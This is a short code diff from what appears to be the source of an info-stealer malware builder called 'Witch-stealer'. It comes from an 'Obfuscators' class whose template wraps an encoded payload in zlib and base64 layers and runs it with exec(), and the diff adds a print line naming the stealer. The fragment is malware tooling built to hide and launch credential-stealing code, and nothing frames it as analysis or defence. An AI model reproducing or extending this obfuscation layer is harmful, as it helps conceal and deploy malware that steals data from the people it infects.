@@ -83,6 +83,7 @@ class Obfuscators:
         layer = f"""
 import zlib, base64
 # bobux
+print ("This is a Witch-stealer")
 exec(zlib.decompress(base64.b64decode("{encoded}")).decode())
 """
         return layer.strip()
